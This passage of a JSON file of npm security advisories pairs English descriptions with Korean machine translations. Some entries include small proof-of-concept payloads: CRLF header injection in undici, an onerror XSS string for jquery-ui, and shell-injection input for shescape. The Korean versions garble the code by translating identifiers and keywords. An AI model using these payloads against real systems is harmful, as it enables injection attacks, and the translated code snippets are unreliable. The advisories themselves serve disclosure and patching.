    "descriptionKR": "### 영향\n\n'ERC165Checker.supportsInterface'는 항상 성공적으로 부울을 반환하고 어떤 상황에서도 되돌리지 않도록 설계되었습니다. 그러나 Solidity 0.8의 'abi.decode'에 대한 잘못된 가정으로 인해 예상대로 EIP-165를 구현하지 않는 대상 계약, 특히 0 또는 1 이외의 값을 반환하는 경우 일부 사례를 되돌릴 수 있습니다.\n\n영향을 받을 수 있는 계약은 'ERC165Checker'를 사용하여 인터페이스에 대한 지원을 확인한 다음 되돌리기 이외의 방법으로 지원 부족을 처리하는 계약입니다.\n\n### 패치\n\n이 문제는 4.7.1에서 패치되었습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3552\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "This affects all versions of package grunt-util-property. The function call could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.",
    "identifiers": "GHSA : GHSA-4hq8-jgr8-mw9j\nCVE : CVE-2020-7641",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:50Z",
    "publishedAt": "2022-07-18T00:00:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7641\nhttps://github.com/mikaelkaron/grunt-util-property/blob/master/main.js%23L41\nhttps://security.snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088\nhttps://github.com/advisories/GHSA-4hq8-jgr8-mw9j",
    "name": "grunt-util-property",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.2",
    "descriptionKR": "이것은 패키지 grunt-util-property의 모든 버전에 영향을 미칩니다. 함수 호출은 `__proto__` 페이로드를 사용하여 `Object.prototype`의 속성을 추가하거나 수정하도록 속일 수 있습니다."
  },
  {
    "description": "### Impact\n\nAuthorization headers are already cleared on cross-origin redirect in\nhttps://github.com/nodejs/undici/blob/main/lib/handler/redirect.js#L189, based on https://github.com/nodejs/undici/issues/872.\n\nHowever, cookie headers which are sensitive headers and are official headers found in the spec, remain uncleared. There also has been active discussion of implementing a cookie store https://github.com/nodejs/undici/pull/1441, which suggests that there are active users using cookie headers in undici.\nAs such this may lead to accidental leakage of cookie to a 3rd-party site or a malicious attacker who can control the redirection target (ie. an open redirector) to leak the cookie to the 3rd party site.\n\n### Patches\n\nThis was patched in v5.8.0.\n\n### Workarounds\n\nBy default, this vulnerability is not exploitable.\nDo not enable redirections, i.e. `maxRedirections: 0` (the default). \n\n### References\n\nhttps://hackerone.com/reports/1635514\nhttps://curl.se/docs/CVE-2018-1000007.html\nhttps://curl.se/docs/CVE-2022-27776.html\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [undici repository](https://github.com/nodejs/undici/issues)\n* To make a report, follow the [SECURITY](https://github.com/nodejs/node/blob/HEAD/SECURITY.md) document\n",
    "identifiers": "GHSA : GHSA-q768-x9m6-m9qp\nCVE : CVE-2022-31151",
    "severity": "LOW",
    "updatedAt": "2023-01-30T05:06:48Z",
    "publishedAt": "2022-07-21T20:31:05Z",
    "references": "https://github.com/nodejs/undici/security/advisories/GHSA-q768-x9m6-m9qp\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31151\nhttps://github.com/nodejs/undici/issues/872\nhttps://github.com/nodejs/undici/pull/1441\nhttps://github.com/nodejs/undici/commit/0a5bee9465e627be36bac88edf7d9bbc9626126d\nhttps://github.com/nodejs/undici/blob/main/lib/handler/redirect.js#L189\nhttps://github.com/nodejs/undici/releases/tag/v5.8.0\nhttps://hackerone.com/reports/1635514\nhttps://security.netapp.com/advisory/ntap-20220909-0006/\nhttps://github.com/advisories/GHSA-q768-x9m6-m9qp",
    "name": "undici",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.8.0",
    "identifier": "5.8.0",
    "descriptionKR": "### 영향\n\n인증 헤더는 교차 출처 리디렉션에서 이미 지워졌습니다.\nhttps://github.com/nodejs/undici/blob/main/lib/handler/redirect.js#L189, https://github.com/nodejs/undici/issues/872 기반.\n\n그러나 민감한 헤더이고 사양에서 발견되는 공식 헤더인 쿠키 헤더는 여전히 불명확합니다. 또한 쿠키 저장소 https://github.com/nodejs/undici/pull/1441 구현에 대한 활발한 논의가 있었는데, 이는 undici에서 쿠키 헤더를 사용하는 활성 사용자가 있음을 시사합니다.\n따라서 제3자 사이트로 쿠키가 우발적으로 유출되거나 리디렉션 대상(예: 열린 리디렉터)을 제어할 수 있는 악의적인 공격자가 쿠키를 제3자 사이트로 유출할 수 있습니다.\n\n### 패치\n\n이것은 v5.8.0에서 패치되었습니다.\n\n### 해결 방법\n\n기본적으로 이 취약점은 악용될 수 없습니다.\n리디렉션, 즉 `maxRedirections: 0`(기본값)을 활성화하지 마십시오.\n\n### 참조\n\nhttps://hackerone.com/reports/1635514\nhttps://curl.se/docs/CVE-2018-1000007.html\nhttps://curl.se/docs/CVE-2022-27776.html\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [undici 저장소](https://github.com/nodejs/undici/issues)에서 이슈 열기\n* 신고는 [SECURITY](https://github.com/nodejs/node/blob/HEAD/SECURITY.md) 문서를 따라주세요."
  },
  {
    "description": "### Impact\n\nIt is possible to inject CRLF sequences into request headers in Undici.\n\n```js\nconst undici = require('undici')\n\nconst response = undici.request(\"http://127.0.0.1:1000\", {\n  headers: {'a': \"\\r\\nb\"}\n})\n```\n\nThe same applies to `path` and `method`\n\n### Patches\n\nUpdate to v5.8.0\n\n### Workarounds\n\nSanitize all HTTP headers from untrusted sources to eliminate `\\r\\n`.\n\n### References\n\nhttps://hackerone.com/reports/409943\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12116\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [undici repository](https://github.com/nodejs/undici/issues)\n* To make a report, follow the [SECURITY](https://github.com/nodejs/node/blob/HEAD/SECURITY.md) document\n",
    "identifiers": "GHSA : GHSA-3cvr-822r-rqcc\nCVE : CVE-2022-31150",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:07Z",
    "publishedAt": "2022-07-21T20:30:10Z",
    "references": "https://github.com/nodejs/undici/security/advisories/GHSA-3cvr-822r-rqcc\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31150\nhttps://github.com/nodejs/undici/commit/a29a151d0140d095742d21a004023d024fe93259\nhttps://hackerone.com/reports/409943\nhttps://github.com/nodejs/undici/releases/tag/v5.8.0\nhttps://security.netapp.com/advisory/ntap-20220915-0002/\nhttps://github.com/advisories/GHSA-3cvr-822r-rqcc",
    "name": "undici",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.8.0",
    "identifier": "5.8.0",
    "descriptionKR": "### 영향\n\nUndici의 요청 헤더에 CRLF 시퀀스를 삽입하는 것이 가능합니다.\n\n```js\nconst undici = 요구('undici')\n\nconst 응답 = undici.request(\"http://127.0.0.1:1000\", {\n  헤더: {'a': \"\\r\\nb\"}\n})\n```\n\n`경로`와 `방법`도 마찬가지입니다.\n\n### 패치\n\nv5.8.0으로 업데이트\n\n### 해결 방법\n\n`\\r\\n`을 제거하기 위해 신뢰할 수 없는 소스의 모든 HTTP 헤더를 삭제합니다.\n\n### 참조\n\nhttps://hackerone.com/reports/409943\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12116\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [undici 저장소](https://github.com/nodejs/undici/issues)에서 이슈 열기\n* 신고는 [SECURITY](https://github.com/nodejs/node/blob/HEAD/SECURITY.md) 문서를 따라주세요."
  },
  {
    "description": "Visual Studio Code npm-script Extension Remote Code Execution Vulnerability",
    "identifiers": "GHSA : GHSA-r84v-qff8-jv5g\nCVE : CVE-2021-26700",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:03:02Z",
    "publishedAt": "2022-05-24T17:43:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-26700\nhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26700\nhttps://github.com/advisories/GHSA-r84v-qff8-jv5g",
    "name": "vscode-npm-script",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.0.0",
    "descriptionKR": "Visual Studio Code npm-script 확장 원격 코드 실행 취약성"
  },
  {
    "description": "The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.",
    "identifiers": "GHSA : GHSA-4wf5-vphf-c2xc\nCVE : CVE-2022-25858",
    "severity": "HIGH",
    "updatedAt": "2023-04-11T23:40:10Z",
    "publishedAt": "2022-07-16T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25858\nhttps://github.com/terser/terser/commit/a4da7349fdc92c05094f41d33d06d8cd4e90e76b\nhttps://github.com/terser/terser/commit/d8cc5691be980d663c29cc4d5ce67e852d597012\nhttps://github.com/terser/terser/blob/master/lib/compress/evaluate.js%23L135\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2949722\nhttps://snyk.io/vuln/SNYK-JS-TERSER-2806366\nhttps://github.com/advisories/GHSA-4wf5-vphf-c2xc",
    "name": "terser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.14.2",
    "identifier": "5.14.2",
    "descriptionKR": "4.8.1 이전, 5.0.0 및 5.14.2 이전 패키지는 정규식의 안전하지 않은 사용으로 인해 정규식 서비스 거부(ReDoS)에 취약합니다."
  },
  {
    "description": "The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.",
    "identifiers": "GHSA : GHSA-4wf5-vphf-c2xc\nCVE : CVE-2022-25858",
    "severity": "HIGH",
    "updatedAt": "2023-04-11T23:40:10Z",
    "publishedAt": "2022-07-16T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25858\nhttps://github.com/terser/terser/commit/a4da7349fdc92c05094f41d33d06d8cd4e90e76b\nhttps://github.com/terser/terser/commit/d8cc5691be980d663c29cc4d5ce67e852d597012\nhttps://github.com/terser/terser/blob/master/lib/compress/evaluate.js%23L135\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2949722\nhttps://snyk.io/vuln/SNYK-JS-TERSER-2806366\nhttps://github.com/advisories/GHSA-4wf5-vphf-c2xc",
    "name": "terser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.8.1",
    "identifier": "4.8.1",
    "descriptionKR": "4.8.1 이전, 5.0.0 및 5.14.2 이전 패키지는 정규식의 안전하지 않은 사용으로 인해 정규식 서비스 거부(ReDoS)에 취약합니다."
  },
  {
    "description": "All versions of package angular are vulnerable to Cross-site Scripting (XSS) due to insecure page caching in the Internet Explorer browser, which allows interpolation of <textarea> elements.\n\nNPM package [angular](https://www.npmjs.com/package/angular) is deprecated. Those who want to receive security updates should use the actively maintained package [@angular/core](https://www.npmjs.com/package/@angular/core).",
    "identifiers": "GHSA : GHSA-prc3-vjfx-vhm9\nCVE : CVE-2022-25869",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:05:50Z",
    "publishedAt": "2022-07-16T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25869\nhttps://glitch.com/edit/%23%21/angular-repro-textarea-xss\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-2949783\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBANGULAR-2949784\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2949782\nhttps://snyk.io/vuln/SNYK-JS-ANGULAR-2949781\nhttps://github.com/advisories/GHSA-prc3-vjfx-vhm9",
    "name": "angular",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.8.3",
    "descriptionKR": "모든 버전의 Angular 패키지는 <textarea> 요소의 보간을 허용하는 Internet Explorer 브라우저의 안전하지 않은 페이지 캐싱으로 인해 XSS(Cross-site Scripting)에 취약합니다.\n\nNPM 패키지 [angular](https://www.npmjs.com/package/angular)는 더 이상 사용되지 않습니다. 보안 업데이트를 받으려면 적극적으로 관리되는 패키지[@angular/core](https://www.npmjs.com/package/@angular/core)를 사용해야 합니다."
  },
  {
    "description": "glob-parent 6.0.0 is vulnerable to Regular Expression Denial of Service (ReDoS). This issue is fixed in version 6.0.1.\n\nThis vulnerability is separate from [GHSA-ww39-953v-wcq6](https://github.com/advisories/GHSA-ww39-953v-wcq6).",
    "identifiers": "GHSA : GHSA-cj88-88mr-972w\nCVE : CVE-2021-35065",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:01:16Z",
    "publishedAt": "2022-07-18T17:03:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-35065\nhttps://github.com/opensearch-project/OpenSearch-Dashboards/issues/1103\nhttps://github.com/gulpjs/glob-parent/pull/49\nhttps://www.mend.io/vulnerability-database/CVE-2021-35065\nhttps://github.com/gulpjs/glob-parent/releases/tag/v6.0.1\nhttps://github.com/gulpjs/glob-parent/commit/32f6d52663b7addac38d0dff570d8127edf03f47\nhttps://security.snyk.io/vuln/SNYK-JS-GLOBPARENT-1314294\nhttps://github.com/gulpjs/glob-parent/commit/3e9f04a3b4349db7e1962d87c9a7398cda51f339\nhttps://github.com/advisories/GHSA-cj88-88mr-972w",
    "name": "glob-parent",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 6.0.0",
    "identifier": "6.0.1",
    "descriptionKR": "glob-parent 6.0.0은 정규식 서비스 거부(ReDoS)에 취약합니다. 이 문제는 버전 6.0.1에서 수정되었습니다.\n\n이 취약점은 [GHSA-ww39-953v-wcq6](https://github.com/advisories/GHSA-ww39-953v-wcq6)과 별개입니다."
  },
  {
    "description": "Properties-Reader prior to version 2.2.0 is vulnerable to prototype pollution. Version 2.2.0 contains a patch for this issue.",
    "identifiers": "GHSA : GHSA-jxvf-m3x5-mxwq\nCVE : CVE-2020-28471",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:00:59Z",
    "publishedAt": "2022-07-19T14:28:59Z",
    "references": "https://github.com/steveukx/properties/issues/40\nhttps://github.com/steveukx/properties/commit/0877cc871db9865f58dd9389ce99e61be05380a5\nhttps://github.com/steveukx/properties/commit/4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab\nhttps://security.snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-28471\nhttps://github.com/advisories/GHSA-jxvf-m3x5-mxwq",
    "name": "properties-reader",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.0",
    "identifier": "2.2.0",
    "descriptionKR": "Properties-Reader 2.2.0 이전 버전은 프로토타입 오염에 취약합니다. 버전 2.2.0에는 이 문제에 대한 패치가 포함되어 있습니다."
  },
  {
    "description": "markdown-it-decorate adds attributes, IDs and classes to Markdown, and the most recent version 1.2.2 was published in 2017. All versions are currently vulnerable to cross-site scripting (XSS) and there is no fixed version at this time",
    "identifiers": "GHSA : GHSA-rhf5-2378-3w3w\nCVE : CVE-2020-28459",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:01:00Z",
    "publishedAt": "2022-07-19T14:16:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28459\nhttps://github.com/rstacruz/markdown-it-decorate/commit/a6b33ce79e9b8cddf6184c754713e6af65253909\nhttps://security.snyk.io/vuln/SNYK-JS-MARKDOWNITDECORATE-1044068\nhttps://github.com/advisories/GHSA-rhf5-2378-3w3w",
    "name": "markdown-it-decorate",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.2.2",
    "descriptionKR": "markdown-it-decorate는 Markdown에 속성, ID 및 클래스를 추가하고 가장 최신 버전인 1.2.2는 2017년에 게시되었습니다. 현재 모든 버전은 XSS(교차 사이트 스크립팅)에 취약하며 현재로서는 수정된 버전이 없습니다."
  },
  {
    "description": "The npm-dependency-versions package through 0.3.0 for Node.js allows command injection if an attacker is able to call dependencyVersions with a JSON object in which pkgs is a key, and there are shell metacharacters in a value.",
    "identifiers": "GHSA : GHSA-m7xq-8jp8-rj2c\nCVE : CVE-2022-29080",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:04Z",
    "publishedAt": "2022-04-13T00:00:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-29080\nhttps://github.com/barneycarroll/npm-dependency-versions/issues/6\nhttps://www.npmjs.com/package/npm-dependency-versions\nhttps://github.com/advisories/GHSA-m7xq-8jp8-rj2c",
    "name": "npm-dependency-versions",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.3.0",
    "descriptionKR": "Node.js용 npm-dependency-versions 패키지 0.3.0은 공격자가 pkgs가 키인 JSON 개체로 dependencyVersions를 호출할 수 있고 값에 셸 메타문자가 있는 경우 명령 삽입을 허용합니다."
  },
  {
    "description": "Versions of thenify prior to 3.3.1 made use of unsafe calls to `eval`. Untrusted user input could thus lead to arbitrary code execution on the host. The patch in version 3.3.1 removes calls to `eval`.",
    "identifiers": "GHSA : GHSA-29xr-v42j-r956\nCVE : CVE-2020-7677",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-23T18:54:10Z",
    "publishedAt": "2022-07-18T19:15:29Z",
    "references": "https://github.com/thenables/thenify/issues/29\nhttps://github.com/thenables/thenify/commit/0d94a24eb933bc835d568f3009f4d269c4c4c17a\nhttps://security.snyk.io/vuln/SNYK-JS-THENIFY-571690\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-7677\nhttps://github.com/thenables/thenify/blob/master/index.js%23L17\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-572317\nhttps://lists.debian.org/debian-lts-announce/2022/09/msg00039.html\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MTEUUTNIEBHGKUKKLNUZSV7IEP6IP3Q3/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UM6XJ73Q3NAM5KSGCOKJ2ZIA6GUWUJLK/\nhttps://github.com/advisories/GHSA-29xr-v42j-r956",
    "name": "thenify",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.3.1",
    "identifier": "3.3.1",
    "descriptionKR": "3.3.1 이전의 thenify 버전은 'eval'에 대한 안전하지 않은 호출을 사용했습니다. 따라서 신뢰할 수 없는 사용자 입력은 호스트에서 임의의 코드 실행으로 이어질 수 있습니다. 버전 3.3.1의 패치는 `eval`에 대한 호출을 제거합니다."
  },
  {
    "description": "### Impact\nInitializing a checkboxradio widget on an input enclosed within a label makes that parent label contents considered as the input label. If you call `.checkboxradio( \"refresh\" )` on such a widget and the initial HTML contained encoded HTML entities, they will erroneously get decoded. This can lead to potentially executing JavaScript code.\n\nFor example, starting with the following initial secure HTML:\n```html\n<label>\n\t<input id=\"test-input\">\n\t&lt;img src=x onerror=\"alert(1)\"&gt;\n</label>\n```\nand calling:\n```js\n$( \"#test-input\" ).checkboxradio();\n$( \"#test-input\" ).checkboxradio( \"refresh\" );\n```\nwill turn the initial HTML into:\n```html\n<label>\n\t<!-- some jQuery UI elements -->\n\t<input id=\"test-input\">\n\t<img src=x onerror=\"alert(1)\">\n</label>\n```\nand the alert will get executed.\n\n### Patches\nThe bug has been patched in jQuery UI 1.13.2.\n\n### Workarounds\nTo remediate the issue, if you can change the initial HTML, you can wrap all the non-input contents of the `label` in a `span`:\n```html\n<label>\n\t<input id=\"test-input\">\n\t<span>&lt;img src=x onerror=\"alert(1)\"&gt;</span>\n</label>\n```\n\n### References\nhttps://blog.jqueryui.com/2022/07/jquery-ui-1-13-2-released/\n\n### For more information\nIf you have any questions or comments about this advisory, search for a relevant issue in [the jQuery UI repo](https://github.com/jquery/jquery-ui/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc). If you don't find an answer, open a new issue.",
    "identifiers": "GHSA : GHSA-h6gj-6jjq-h8g9\nCVE : CVE-2022-31160",
    "severity": "MODERATE",
    "updatedAt": "2023-02-01T05:03:16Z",
    "publishedAt": "2022-07-18T17:07:36Z",
    "references": "https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31160\nhttps://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9\nhttps://blog.jqueryui.com/2022/07/jquery-ui-1-13-2-released/\nhttps://www.drupal.org/sa-contrib-2022-052\nhttps://security.netapp.com/advisory/ntap-20220909-0007/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6XBR3G3JR5ZIOJDO4224M3INXDS2VFDD/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/J5LGNTICB5BRFAG3DHVVELS6H3CZSQMO/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QB2FJQXCNHO32VGVOC6DY6IPGVE4VDU6/\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00015.html\nhttps://github.com/advisories/GHSA-h6gj-6jjq-h8g9",
    "name": "jquery-ui",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.13.2",
    "identifier": "1.13.2",
    "descriptionKR": "### 영향\n레이블 안에 포함된 입력에서 checkboxradio 위젯을 초기화하면 상위 레이블 내용이 입력 레이블로 간주됩니다. 이러한 위젯에서 `.checkboxradio( \"refresh\" )`를 호출하고 초기 HTML에 인코딩된 HTML 엔터티가 포함되어 있으면 잘못 디코딩됩니다. 이로 인해 잠재적으로 JavaScript 코드가 실행될 수 있습니다.\n\n예를 들어 다음과 같은 초기 보안 HTML로 시작합니다.\n```html\n<레이블>\n<입력 ID=\"테스트 입력\">\n<img src=x onerror=\"경고(1)\">\n</레이블>\n```\n전화:\n```js\n$( \"#테스트 입력\" ).checkboxradio();\n$( \"#test-input\" ).checkboxradio( \"새로 고침\" );\n```\n초기 HTML을 다음과 같이 변환합니다.\n```html\n<레이블>\n<!-- 일부 jQuery UI 요소 -->\n<입력 ID=\"테스트 입력\">\n<img src=x onerror=\"경고(1)\">\n</레이블>\n```\n경고가 실행됩니다.\n\n### 패치\n이 버그는 jQuery UI 1.13.2에서 패치되었습니다.\n\n### 해결 방법\n문제를 해결하기 위해 초기 HTML을 변경할 수 있는 경우 `label`의 모든 비입력 콘텐츠를 `span`으로 래핑할 수 있습니다.\n```html\n<레이블>\n<입력 ID=\"테스트 입력\">\n<span><img src=x onerror=\"alert(1)\"></span>\n</레이블>\n```\n\n### 참조\nhttps://blog.jqueryui.com/2022/07/jquery-ui-1-13-2-released/\n\n### 자세한 내용은\n이 권고에 대해 질문이나 의견이 있는 경우 [jQuery UI 저장소](https://github.com/jquery/jquery-ui/issues?q=is%3Aissue+is%3Aopen+)에서 관련 문제를 검색하십시오. sort%3Aupdated-desc). 답변을 찾지 못한 경우 새 문제를 엽니다."
  },
  {
    "description": "### Impact\n\nThis only impacts users that use the `escape` or `escapeAll` functions with the `interpolation` option set to `true`. Example:\n\n```javascript\nimport cp from \"node:child_process\";\nimport * as shescape from \"shescape\";\n\n// 1. Prerequisites\nconst options = {\n  shell: \"bash\",\n  // Or\n  shell: \"dash\",\n  // Or\n  shell: \"powershell.exe\",\n  // Or\n  shell: \"zsh\",\n  // Or\n  shell: undefined, // Only if the default shell is one of the affected shells.\n};\n\n// 2. Attack (one of multiple)\nconst payload = \"foo #bar\";\n\n// 3. Usage\nlet escapedPayload;\nshescape.escape(payload, { interpolation: true });\n// Or\nshescape.escapeAll(payload, { interpolation: true });\n\ncp.execSync(`echo Hello ${escapedPayload}!`, options);\n// _Output depends on the shell being used_\n```\n\nThe result is that if an attacker is able to include whitespace in their input they can:\n\n1. Invoke shell-specific behaviour through shell-specific special characters inserted directly after whitespace.\n   - Affected shells: _Bash_, _Dash_, _Zsh_, _PowerShell_\n2. Invoke shell-specific behaviour through shell-specific special characters inserted or appearing after line terminating characters. \n   - Affected shells: _Bash_\n3. Invoke arbitrary commands by inserting a line feed character.\n   - Affected Shells: _Bash_, _Dash_, _Zsh_, _PowerShell_\n3. Invoke arbitrary commands by inserting a carriage return character.\n   - Affected Shells: _PowerShell_\n\n### Patches\n\nBehaviour number 1 has been patched in [v1.5.7] which you can upgrade to now. No further changes are required.\n\nBehaviour number 2, 3, and 4 have been patched in [v1.5.8] which you can upgrade to now. No further changes are required.\n\n### Workarounds\n\nThe best workaround is to avoid having to use the `interpolation: true` option - in most cases using an alternative is possible, see [the recipes](https://github.com/ericcornelissen/shescape#recipes) for recommendations.\n\nAlternatively, you can strip all whitespace from user input. Note that this is error prone, for example: for PowerShell this requires stripping `'\\u0085'` which is not included in JavaScript's definition of `\\s` for Regular Expressions.\n\n### References\n\n- https://github.com/ericcornelissen/shescape/pull/322\n- https://github.com/ericcornelissen/shescape/pull/324\n- https://github.com/ericcornelissen/shescape/pull/332\n- https://github.com/ericcornelissen/shescape/releases/tag/v1.5.7\n- https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\n\n### For more information\n\n- Comment on:\n  - For behaviour 1 (PowerShell): https://github.com/ericcornelissen/shescape/pull/322\n  - For behaviour 1 (Bash, Dash, Zsh): https://github.com/ericcornelissen/shescape/pull/324\n  - For behaviour 2, 3, 4 (_any shell_): https://github.com/ericcornelissen/shescape/pull/332\n- Open an issue at https://github.com/ericcornelissen/shescape/issues (_New issue_ > _Question_ > _Get started_)\n- If you're missing CMD from this advisory, see https://github.com/ericcornelissen/shescape/security/advisories/GHSA-jjc5-fp7p-6f8w\n\n[v1.5.7]: https://github.com/ericcornelissen/shescape/releases/tag/v1.5.7\n[v1.5.8]: https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\n\n",
    "identifiers": "GHSA : GHSA-44vr-rwwj-p88h\nCVE : CVE-2022-31180",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:01:31Z",
    "publishedAt": "2022-07-15T21:46:08Z",
    "references": "https://github.com/ericcornelissen/shescape/security/advisories/GHSA-44vr-rwwj-p88h\nhttps://github.com/ericcornelissen/shescape/pull/322\nhttps://github.com/ericcornelissen/shescape/pull/324\nhttps://github.com/ericcornelissen/shescape/pull/332\nhttps://github.com/ericcornelissen/shescape/releases/tag/v1.5.7\nhttps://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31180\nhttps://github.com/advisories/GHSA-44vr-rwwj-p88h",
    "name": "shescape",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.4.0, < 1.5.8",
    "identifier": "1.5.8",
    "descriptionKR": "### 영향\n\n이는 `보간` 옵션이 `true`로 설정된 `escape` 또는 `escapeAll` 기능을 사용하는 사용자에게만 영향을 미칩니다. 예:\n\n```자바스크립트\n\"node:child_process\"에서 cp 가져오기;\n\"shescape\"에서 *를 shescape로 가져오기;\n\n// 1. 전제 조건\nconst 옵션 = {\n  쉘: \"bash\",\n  // 또는\n  쉘: \"대시\",\n  // 또는\n  쉘: \"powershell.exe\",\n  // 또는\n  쉘: \"zsh\",\n  // 또는\n  shell: undefined, // 기본 셸이 영향을 받는 셸 중 하나인 경우에만.\n};\n\n// 2. 공격(여러 개 중 하나)\nconst 페이로드 = \"foo #bar\";\n\n// 3. 사용법\nlet escapedPayload;\nshescape.escape(payload, { interpolation: true });\n// 또는\nshescape.escapeAll(payload, { interpolation: true });\n\ncp.execSync(`echo Hello ${escapedPayload}!`, options);\n// _출력은 사용 중인 쉘에 따라 다름_\n```\n\n그 결과 공격자가 입력에 공백을 포함할 수 있는 경우 다음을 수행할 수 있습니다.\n\n1. 공백 바로 뒤에 삽입된 쉘 특정 특수 문자를 통해 쉘 특정 동작을 호출합니다.\n   - 영향을 받는 셸: _Bash_, _Dash_, _Zsh_, _PowerShell_\n2. 줄 종료 문자 뒤에 삽입되거나 나타나는 쉘 특정 특수 문자를 통해 쉘 특정 동작을 호출합니다.\n   - 영향을 받는 포탄: _Bash_\n3. 줄 바꿈 문자를 삽입하여 임의의 명령을 호출합니다.\n   - 영향을 받는 쉘: _Bash_, _Dash_, _Zsh_, _PowerShell_\n3. 캐리지 리턴 문자를 삽입하여 임의의 명령을 호출합니다.\n   - 영향을 받는 셸: _PowerShell_\n\n### 패치\n\n동작 번호 1은 지금 업그레이드할 수 있는 [v1.5.7]에서 패치되었습니다. 추가 변경이 필요하지 않습니다.\n\n동작 번호 2, 3, 4는 지금 업그레이드할 수 있는 [v1.5.8]에서 패치되었습니다. 추가 변경이 필요하지 않습니다.\n\n### 해결 방법\n\n가장 좋은 해결 방법은 '보간: true' 옵션을 사용하지 않는 것입니다. 대부분의 경우 대안을 사용할 수 있습니다. 권장 사항은 [레시피](https://github.com/ericcornelissen/shescape#recipes)를 참조하세요.\n\n또는 사용자 입력에서 모든 공백을 제거할 수 있습니다. 이것은 오류가 발생하기 쉽습니다. 예를 들어 PowerShell의 경우 정규식에 대한 JavaScript의 `\\s` 정의에 포함되지 않은 `'\\u0085'`를 제거해야 합니다.\n\n### 참조\n\n- https://github.com/ericcornelissen/shescape/pull/322\n- https://github.com/ericcornelissen/shescape/pull/324\n- https://github.com/ericcornelissen/shescape/pull/332\n- https://github.com/ericcornelissen/shescape/releases/tag/v1.5.7\n- https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\n\n### 자세한 내용은\n\n- 코멘트:\n  - 동작 1(PowerShell): 